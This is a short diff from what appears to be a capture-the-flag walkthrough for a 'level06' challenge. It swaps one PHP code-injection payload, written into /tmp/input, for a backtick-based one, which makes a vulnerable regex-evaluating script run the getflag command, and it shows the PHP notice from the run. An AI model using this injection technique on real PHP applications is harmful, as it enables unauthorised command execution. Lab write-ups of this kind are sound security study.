@@ -9,7 +9,7 @@
     $r = x($argv[1], $argv[2]); print $r;
     ?>
 
->echo '[x {${system(getflag)}}]' > /tmp/input
+>echo '[x ${`getflag`}]' > /tmp/input
 
 >./level06 /tmp/input
     PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
